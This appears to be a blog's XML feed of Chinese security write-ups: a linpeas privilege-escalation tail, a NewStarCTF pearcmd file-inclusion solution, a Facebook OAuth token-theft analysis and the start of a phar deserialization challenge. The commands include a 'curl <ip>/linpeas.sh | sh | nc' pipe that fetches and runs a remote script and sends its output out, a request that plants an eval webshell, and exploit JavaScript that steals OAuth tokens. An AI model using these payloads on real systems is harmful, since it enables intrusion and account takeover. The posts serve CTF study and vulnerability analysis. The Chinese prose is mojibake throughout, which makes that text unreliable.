cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl æœ¬åœ° ip/linpeas.sh | sh</span><br><span class="line">curl æœ¬åœ° ip/linpeas.sh | sh | nc #æœ¬åœ°ç›‘å¬ ip æœ¬åœ°ç›‘å¬ç«¯å£ # å°†æ‰«æç»“æœå›å¼¹åˆ°æœ¬åœ°</span><br></pre></td></tr></table></figure><p>æœ¬åœ°æœº 2:</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nc -lvnp ç«¯å£å· | tee linpeas.txt</span><br></pre></td></tr></table></figure><p>å¦‚æœé¶æœºæ‰§è¡Œç¬¬äºŒæ¡è¯­å¥, æœ¬åœ°æœº 2 å°±ä¼šè·å¾—æ‰«æç»“æœæ–‡æœ¬.</p><p>æ–‡ç« å‚è€ƒè§†é¢‘:</p><p><a href="https://www.bilibili.com/video/BV1Wh4y1H7LK/?spm_id_from=333.1007.top_right_bar_window_history.content.click">https://www.bilibili.com/video/BV1Wh4y1H7LK/?spm_id_from=333.1007.top_right_bar_window_history.content.click</a></p>]]></content>
      
      
      <categories>
          
          <category> AWD </category>
          
          <category> çº¢é˜Ÿ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> ææƒ </tag>
            
            <tag> ä¿¡æ¯æšä¸¾ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€NewStarCTF2023ã€‘ IncludeğŸ pearcmd æ–‡ä»¶åŒ…å«</title>
      <link href="/2023/11/09/NewStarCTF2023-Include-pearcmd-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
      <url>/2023/11/09/NewStarCTF2023-Include-pearcmd-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
      
        <content type="html"><![CDATA[<h1 id="ã€NewStarCTF2023ã€‘-IncludeğŸ-pearcmd-æ–‡ä»¶åŒ…å«"><a href="#ã€NewStarCTF2023ã€‘-IncludeğŸ-pearcmd-æ–‡ä»¶åŒ…å«" class="headerlink" title="ã€NewStarCTF2023ã€‘ IncludeğŸ pearcmd æ–‡ä»¶åŒ…å«"></a>ã€NewStarCTF2023ã€‘ IncludeğŸ pearcmd æ–‡ä»¶åŒ…å«</h1><h2 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h2><p>è¿›å…¥é¶æœº, çœ‹åˆ°ä»£ç :</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag|log|session|filter|input|data/i&#x27;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">        <span class="comment"># Something in phpinfo.php!</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ³¨é‡Šæç¤ºæˆ‘ä»¬å»çœ‹ <code>phpinfo.php</code> , è·¯å¾„è¾“å…¥, å¯ä»¥çœ‹åˆ° phpinfo(), ç„¶åçœ‹åˆ°æœ‰ä¸€ä¸ª Flag å­—æ®µ, é‡Œé¢å†™ç€ <code>fake&#123;Check_register_argc_argv&#125;</code> åˆæ˜¯æç¤º, ç›´æ¥æœè¿™ä¸ªå­—æ®µ, å‘ç° <code>register_argc_argv = ON</code>, å†åŠ ä¸Šé¢˜ç›®æºç æç¤º,é‚£å°±å¾ˆæ˜æ˜¾æ˜¯ pear æ–‡ä»¶åŒ…å«æ¼æ´äº†.</p><h2 id="è§£é¢˜æ€è·¯"><a href="#è§£é¢˜æ€è·¯" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h2><h3 id="pear"><a href="#pear" class="headerlink" title="pear"></a>pear</h3><p>é¦–å…ˆå…ˆæ¥ä»‹ç»ä¸€ä¸‹ pear, pearçš„å…¨ç§°ä¸º<code>PHP Extension and Application Repository</code>ï¼Œä¸­æ–‡ç¿»è¯‘ä¸ºphpæ‰©å±•å’Œåº”ç”¨ä»“åº“ï¼Œæ¶µç›–äº†é¡µé¢å‘ˆç°ã€æ•°æ®åº“è®¿é—®ã€æ–‡ä»¶æ“ä½œã€æ•°æ®ç»“æ„ã€ç¼“å­˜æ“ä½œã€ç½‘ç»œåè®®ã€WebService ç­‰è®¸å¤šæ–¹é¢ï¼Œç”¨æˆ·å¯ä»¥é€šè¿‡ä¸‹è½½è¿™äº›ç±»åº“å¹¶é€‚å½“çš„ä½œä¸€äº›å®šåˆ¶ä»¥å®ç°è‡ªå·±éœ€è¦çš„åŠŸèƒ½ã€‚é¿å…é‡å¤é€ è½®å­.</p><p>å¯ä»¥é€šè¿‡ pear å‘½ä»¤å¾€ php ç›®å½•ä¸­ä¸‹è½½å†…å®¹(å‡ºç½‘ä¸‹è½½), ä¹Ÿå¯ä»¥ä½¿ç”¨ pear å‘½ä»¤åˆ›å»ºå†…å®¹(ä¸å‡ºç½‘).</p><h3 id="register-argc-argv"><a href="#register-argc-argv" class="headerlink" title="register_argc_argv"></a>register_argc_argv</h3><p><code>register_argc_argv</code> æ˜¯ <code>php.ini</code> é‡Œé¢çš„ä¸€ä¸ªé€‰é¡¹ï¼Œé»˜è®¤ä¸ºOFFï¼Œå¦‚æœè¢«è®¾ç½®æˆ ON, é‚£ä¹ˆå°±èƒ½è·å¾—ä»¥ä¸‹æƒåˆ©:</p><ol><li>åœ¨å‘½ä»¤è¡Œæ¨¡å¼ä¸‹, é€šè¿‡ <code>$_SERVER[â€˜argvâ€™]</code> è·å¾—å‘½ä»¤è¡Œå‚æ•°</li><li>åœ¨ Web æ¨¡å¼ä¸‹, å¯ä»¥åœ¨ URL é‡ŒåµŒå…¥ <code>+</code> å·, å…¶ä¸­ä¼šå°†<code>+</code> å·é“¾æ¥çš„å‚æ•°çš„ä¸ªæ•°å­˜å…¥ <code>argc</code>, å„ä¸ªå‚æ•°çš„å€¼å­˜å…¥ <code>argv</code>.</li></ol><h3 id="å®Œæ•´åˆ©ç”¨"><a href="#å®Œæ•´åˆ©ç”¨" class="headerlink" title="å®Œæ•´åˆ©ç”¨"></a>å®Œæ•´åˆ©ç”¨</h3><p>åœ¨ <code>pearcmd.php</code> ä¸­, ä¼šæœ‰é€»è¾‘å°è¯• <code>argv</code> å˜é‡, å†å°è¯• <code>_SERVER[&#39;argv&#39;]</code> , å…¶ä¸­<code>_SERVER[&#39;argv&#39;]</code> æ˜¯æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„å˜é‡, æœ€åä¼šæŠŠ <code>_SERVER[&#39;argv&#39;]</code> ç»™ return å‡ºæ¥, æ‰€ä»¥æˆ‘ä»¬è¿™é‡Œå¯ä»¥åœ¨æ–‡ä»¶åŒ…å«ä¸­è·å–çš„æˆ‘ä»¬åœ¨ GET é‡Œä¼ é€’çš„å‚æ•°äº†.</p><p>è¿™é‡Œä½¿ç”¨ <code>config-create</code> æ¥åœ¨æœ¬åœ°æŒ‡å®šç›®å½•åˆ›å»ºæ–‡ä»¶, ç„¶åç”¨ <code>+</code> ä»£æ›¿ç©ºæ ¼, æ„é€ è¯·æ±‚å¦‚ä¸‹:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=@eval($_POST[&#x27;cmd&#x27;]);?&gt;+/tmp/test.php</span><br></pre></td></tr></table></figure><p><img src="/2023/11/09/NewStarCTF2023-Include-pearcmd-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/process.jpg"></p><p>è¿æ¥èšå‰‘, å³å¯ getshell.</p><p><img src="/result.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ–‡ä»¶åŒ…å« </tag>
            
            <tag> pear </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€APIå®‰å…¨æ¼æ´å‰–æã€‘ FaceBook OAuth æ¼æ´ - 2020-03-01</title>
      <link href="/2023/11/09/API%E6%BC%8F%E6%B4%9E-facebook-OAuth/"/>
      <url>/2023/11/09/API%E6%BC%8F%E6%B4%9E-facebook-OAuth/</url>
      
        <content type="html"><![CDATA[<h1 id="ã€APIå®‰å…¨æ¼æ´å‰–æã€‘-FaceBook-OAuth-æ¼æ´-2020-03-01"><a href="#ã€APIå®‰å…¨æ¼æ´å‰–æã€‘-FaceBook-OAuth-æ¼æ´-2020-03-01" class="headerlink" title="ã€APIå®‰å…¨æ¼æ´å‰–æã€‘ FaceBook OAuth æ¼æ´ - 2020-03-01"></a>ã€APIå®‰å…¨æ¼æ´å‰–æã€‘ FaceBook OAuth æ¼æ´ - 2020-03-01</h1><p>ä¿¡æ¯æ¥æº: <a href="https://www.amolbaikar.com/facebook-oauth-framework-vulnerability/">https://www.amolbaikar.com/facebook-oauth-framework-vulnerability/</a></p><h2 id="æ¼æ´æè¿°"><a href="#æ¼æ´æè¿°" class="headerlink" title="æ¼æ´æè¿°"></a>æ¼æ´æè¿°</h2><p>ç¬¬ä¸‰æ–¹ç½‘ç«™å¦‚(Instagram)æ˜¯å¯ä»¥é€šè¿‡ Facebook è´¦å·è¿›è¡Œç™»å½•çš„, å…·ä½“ç™»å½•é€»è¾‘å°±æ˜¯åˆ©ç”¨ Facebook æä¾›çš„ SDK,ä½¿ç”¨ OAuth æˆæƒè¿›è¡Œç™»å½•ã€‚</p><p>å…·ä½“æ¥è¯´å°±æ˜¯ç”¨æˆ·ç™»å½• ins, ç„¶å ins ä¼šæ ¹æ® FaceBook çš„ SDK è§„èŒƒ, è·³è½¬åˆ° Facebook å¯¹åº”çš„ç™»å½•é¡µé¢, Facebook ç™»å½•å®Œæˆä¹‹å, è¿”å›ä¸€ä¸ª access_token ç»™ ins, å®Œæˆç™»å½•ã€‚</p><p>é»‘å®¢åœ¨è¿™ä¸ª OAuth æˆæƒæµç¨‹èƒ½å¤Ÿ<strong>çªƒå– access_token</strong> ,ä»è€Œè¾¾åˆ°æ¥ç®¡ç”¨æˆ·è´¦å·çš„ç›®çš„ã€‚</p><h2 id="æ¼æ´æˆå› "><a href="#æ¼æ´æˆå› " class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h2><p> åœ¨ Facebook æä¾›ç»™å¼€å‘è€…æ¥å…¥çš„ SDK ä¸­, æœ‰ä¸€ä¸ªåä¸º â€œ&#x2F;connect&#x2F;pingâ€ çš„ç™»å½•æœåŠ¡ç«¯, å®ƒæ˜¯æä¾›ç»™ç¬¬ä¸‰æ–¹åº”ç”¨è·å–ç”¨æˆ·è®¿é—®ä»¤ç‰Œçš„ç¬¬ä¸‰æ–¹ç«¯ç‚¹, å…·ä½“é€»è¾‘æ˜¯å¼€å‘è€…é€šè¿‡ç¼–ç åœ¨åå°åˆ›å»ºè·¨åŸŸé€šä¿¡çš„ä»£ç† <code>iframe</code> , å†ä½¿ç”¨ <code>window.postMessage()</code> æ–¹æ³•æ¥æ”¶ä»¤ç‰Œ, åœ¨æ¥æ”¶ä»¤ç‰Œå, è¯¥ API ä¼šæŠŠé“¾æ¥è·³è½¬æŒ‡å‘ Facebook çš„ â€œXD_Arbiterâ€ ä¸‹ã€‚ å®Œæ•´çš„ URL ä¸º(ä»¥ ins ä¸ºä¾‹):</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.facebook.com/connect/ping?client_id=APP_ID&amp;redirect_uri=https://staticxx.facebook.com/connect/xd_arbiter.php?version=42#origin=https://www.instagram.com</span><br></pre></td></tr></table></figure><p> è¿™é‡Œçš„ <code>APP_ID</code> æ˜¯ç¬¬ä¸‰æ–¹åº”ç”¨åœ¨ Facebook æ³¨å†Œæ—¶ç”Ÿæˆçš„åº”ç”¨ ID å€¼ã€‚</p><p> æ”»å‡»è€…å‘ç°è¿™é‡Œçš„ <code>xd_arbiter.php?version=42</code> å¯ä»¥è¢«<strong>ç¯¡æ”¹</strong>æˆ <code>xd_arbiter/?version=42</code> , ç„¶ååœ¨æ­¤åŸºç¡€ä¸‹, èƒ½å¤Ÿå°†ç›®å½•é™„åŠ åˆ°åé¢å®ç°èµ„æºè®¿é—®ã€‚</p><p>åœ¨è¿™é‡Œç”±äºé€šè¿‡ä¸Šè¿°ç›®å½•è·å–åˆ°çš„ <code>access_token</code> çš„ç›¸å…³å€¼éƒ½æ˜¯å“ˆå¸Œç‰‡æ®µ, å¾ˆéš¾å»è¿˜åŸ, ä½†æ˜¯æ”»å‡»è€…åœ¨ <code>page_proxy</code> ç›®å½•ä¸­å‘ç°äº†ä¸€ä¸ªåä¸º <code>7SWBAvHenEn.js</code> çš„ js æ–‡ä»¶, è¿™ä¸ªæ–‡ä»¶ä¸­åŒ…å«å¦‚ä¸‹å†…å®¹:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> frameName = <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>.<span class="title function_">split</span>(<span class="string">&quot;#&quot;</span>)[<span class="number">1</span>];</span><br><span class="line"><span class="variable language_">window</span>.<span class="property">parent</span>.<span class="title function_">postMessage</span>(frameName,<span class="string">&quot;*&quot;</span>);</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€è¡Œä»£ç ä¼šè·å– URL è¯·æ±‚å‚æ•°ä¸­ <code>#</code> åé¢çš„å†…å®¹, å°†å®ƒèµ‹å€¼ç»™ <code>frameName</code> , ç„¶åè°ƒç”¨ <code>window.parent.postMessage</code> è½¬å‘æ¥è‡ª <code>frameName</code> å‘é€çš„å†…å®¹, è¿™é‡Œçš„ <code>*</code> ä»£è¡¨ä»–å¯ä»¥æ¥æ”¶ä»»æ„æºçš„è¯·æ±‚ã€‚</p><p>ç„¶åæ”»å‡»è€…æ„é€  URL ä¸º:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://staticxx.facebook.com/connect/xd_arbiter/r/7SWBAvHenEn.js?version=42</span><br></pre></td></tr></table></figure><p>å°±å¯ä»¥ç©¿è¶Šè®¿é—®åˆ°è¿™ä¸ªæ–‡ä»¶, å†é€šè¿‡ <code>#</code> å»æŒ‡å®šæº, å°±å¯ä»¥æ‹¦æˆªè¯¥æºå‘é€å›æ¥çš„ <code>access_token</code> .</p><p>è¿™ä¸ª js æ–‡ä»¶èƒ½å¤Ÿè¢«æ”»å‡»è€…åˆ©ç”¨, åŸå› å¦‚ä¸‹:</p><ol><li>æ”»å‡»è€…èƒ½å¤Ÿé€šè¿‡èµ„æºé™„åŠ è®¿é—®åˆ°è¿™ä¸ªæ–‡ä»¶.</li><li><code>postMessage()</code> æ–¹æ³•ä¼šå‘é€æœªåŠ å¯†çš„ä»¤ç‰Œ.</li><li><code>*</code> å…è®¸äº†æ”»å‡»è€…èƒ½åœ¨è‡ªå·±çš„æº ip ä¸‹è¯·æ±‚å¹¶è·å–å“åº”.</li><li>API è¯·æ±‚ä¸­æ²¡æœ‰éªŒè¯ <code>X-Frame-Options</code> æ ‡é¢˜,å¯¼è‡´èƒ½å¤Ÿåœ¨ <code>xd_arbiter</code> ä¸­åµŒå…¥è·¨åŸŸåµŒå¥— <code>postMessage()</code> å›æ˜¾çš„çª—å£.</li><li><code>window.parent</code> ä¸‹çš„æ–¹æ³•ä¸ç”¨ä¸ç”¨æˆ·äº¤äº’, ä¸éœ€è¦å…³å¿ƒ<code>window.open</code>æˆ–ä»»ä½•<code>onClick</code>äº‹ä»¶.</li></ol><h2 id="æ¼æ´åŠ«æŒ"><a href="#æ¼æ´åŠ«æŒ" class="headerlink" title="æ¼æ´åŠ«æŒ"></a>æ¼æ´åŠ«æŒ</h2><p>æœ€åæ”»å‡»è€…é‡å†™ <code>Custom_SDK.js</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> app_id = <span class="string">&#x27;124024574287414&#x27;</span>,</span><br><span class="line">app_domain = <span class="string">&#x27;www.instagram.com&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> exploit_url = <span class="string">&#x27;https://www.facebook.com/connect/ping?client_id=&#x27;</span> + app_id + <span class="string">&#x27;&amp;redirect_uri=https%3A%2F%2Fstaticxx.facebook.com%2Fconnect%2Fxd_arbiter%2Fr%2F7SWBAvHenEn.js%3Fversion%3D44%23origin%3Dhttps%253A%252F%252F&#x27;</span> + app_domain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> i = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;iframe&#x27;</span>);</span><br><span class="line">i.<span class="title function_">setAttribute</span>(<span class="string">&#x27;id&#x27;</span>, <span class="string">&#x27;i&#x27;</span>);</span><br><span class="line">i.<span class="title function_">setAttribute</span>(<span class="string">&#x27;style&#x27;</span>, <span class="string">&#x27;display:none;&#x27;</span>);</span><br><span class="line">i.<span class="title function_">setAttribute</span>(<span class="string">&#x27;src&#x27;</span>, exploit_url);</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(i);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;OAuth&#x27;</span>, <span class="keyword">function</span>(<span class="params">FB</span>) &#123;</span><br><span class="line">  <span class="title function_">alert</span>(<span class="variable constant_">FB</span>.<span class="property">data</span>.<span class="property">name</span>);</span><br><span class="line">&#125;, !<span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>å®ç°è·¨åŸŸæ”»å‡», æ¥ç®¡è´¦æˆ·.</p><h2 id="å¯ç¤º"><a href="#å¯ç¤º" class="headerlink" title="å¯ç¤º"></a>å¯ç¤º</h2><p>ä½œä¸ºé˜²å®ˆæ–¹, ä»…ä»…ä½¿ç”¨ URL ç™½åå•æ¥é˜²å¾¡æ˜¯ä¸å¤Ÿçš„, åœ¨é¢å¯¹è·¨åŸŸé€šä¿¡, ä¸åŒè®¾å¤‡ç”šè‡³æµè§ˆå™¨çš„æƒ…å†µä¸‹, å³ä½¿ä½¿ç”¨äº† <code>X-Frame-Options</code> æ¥é˜²æ­¢è·¨åŸŸè¯·æ±‚, ä¹Ÿæœ‰å¯èƒ½ä¼šå› ä¸ºå…¼å®¹æ€§é—®é¢˜äº§ç”Ÿæ¼æ´.</p><p>åœ¨è¿™é‡Œçš„å¯ç¤ºå°±æ˜¯, åº”ç”¨è®¾è®¡æ—¶, åœ¨å®ç°åŠŸèƒ½çš„å‰æä¸‹, è¦å°½å¯èƒ½éµå¾ªç®€å•åŸåˆ™, å‚è€ƒæ ‡å‡†åè®®å®ç°æµç¨‹, <strong>çº¿ä¸Šç¯å¢ƒä¸ä½¿ç”¨çš„æ–‡ä»¶, è¦å°½å¿«æ¸…é™¤</strong>.</p>]]></content>
      
      
      <categories>
          
          <category> APIå®‰å…¨ </category>
          
          <category> æ¼æ´å‰–æ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> API å®‰å…¨ </tag>
            
            <tag> OAuth </tag>
            
            <tag> è·¨åŸŸåŠ«æŒ </tag>
            
            <tag> CSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€NewStarCTF2023ã€‘Unserialize Again phar æ–‡ä»¶ååºåˆ—åŒ–</title>
      <link href="/2023/11/08/NewStarCTF2023-Unserialize-Again/"/>
      <url>/2023/11/08/NewStarCTF2023-Unserialize-Again/</url>
      
        <content type="html"><![CDATA[<h1 id="ã€NewStarCTF2023ã€‘Unserialize-Again-phar-æ–‡ä»¶ååºåˆ—åŒ–"><a href="#ã€NewStarCTF2023ã€‘Unserialize-Again-phar-æ–‡ä»¶ååºåˆ—åŒ–" class="headerlink" title="ã€NewStarCTF2023ã€‘Unserialize Again phar æ–‡ä»¶ååºåˆ—åŒ–"></a>ã€NewStarCTF2023ã€‘Unserialize Again phar æ–‡ä»¶ååºåˆ—åŒ–</h1><h2 id="é¢˜ç›®æºç "><a href="#é¢˜ç›®æºç " class="headerlink" title="é¢˜ç›®æºç "></a>é¢˜ç›®æºç </h2><p>æ‰“å¼€é¶æœºå,è¿›å…¥é¡µé¢å°±ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ ,ç„¶åæŠ“åŒ…çœ‹æºç æç¤ºæˆ‘ä»¬çœ‹ cookies,ç„¶å cookies é‡Œé¢æœ‰ pairing.php, è®¿é—®ä¹‹åå¾—åˆ°é¢˜ç›®æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">story</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$user</span>=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pass</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$eating</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$God</span>=<span class="string">&#x27;false&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;user=<span class="string">&#x27;human&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="number">1</span>==<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="number">1</span>!=<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$fffflag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;user=<span class="string">&#x27;AshenOne&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;eating=<span class="string">&#x27;fire&#x27;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;user.<span class="variable language_">$this</span>-&gt;pass;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;user==<span class="string">&#x27;admin&#x27;</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;pass==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$nothing</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;God==<span class="string">&#x27;true&#x27;</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;user==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;eating);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Get Out!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;                 </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pear&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;apple&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">// $Eden=new story();</span></span><br><span class="line">    <span class="variable">$pear</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;pear&#x27;</span>];</span><br><span class="line">    <span class="variable">$Adam</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;apple&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$pear</span>,<span class="title function_ invoke__">urldecode</span>(<span class="variable">$file</span>));</span><br><span class="line">    <span class="title function_ invoke__">file_exists</span>(<span class="variable">$Adam</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;å¤šåƒé›ªæ¢¨&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="è§£é¢˜æ€è·¯"><a href="#è§£é¢˜æ€è·¯" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h2><p>è¿™ä¸ªç±»è¿™ä¹ˆé•¿,åªæœ‰ <code>__destruct()</code> éƒ¨åˆ†æ˜¯æœ‰ç”¨çš„, è§£é¢˜æ€è·¯å°±æ˜¯è§¦å‘ååºåˆ—åŒ–,ç„¶ååœ¨__destruct()å‡½æ•°å®ç° RCE.</p><h3 id="wakeup-ç»•è¿‡éƒ¨åˆ†"><a href="#wakeup-ç»•è¿‡éƒ¨åˆ†" class="headerlink" title="__wakeup ç»•è¿‡éƒ¨åˆ†"></a>__wakeup ç»•è¿‡éƒ¨åˆ†</h3><p>è¿™é‡Œçš„ <code>__wakeup()</code> å‡½æ•°ä¼šå¼ºåˆ¶æ›´æ”¹ user çš„å€¼,å¯¼è‡´æˆ‘ä»¬æ— æ³• RCE,è‡³äº <code>__construct()</code> æ„é€ å‡½æ•°, å¦‚æœç±»æ˜¯ååºåˆ—åŒ–æ„é€ çš„,é‚£ä¹ˆå°±é»˜è®¤ä¸ä¼šè§¦å‘æ„é€ å‡½æ•°,ä¸ç”¨ç®¡ä»–å°±å¥½,æ‰€ä»¥è¿™é‡Œä»…éœ€è¦ç»•è¿‡ <code>__wakeup()</code>ã€‚â€˜</p><p>å…ˆæ¥äº†è§£ <code>__wakeup()</code> å‡½æ•°ã€‚</p><p><code>__wakeup()</code> 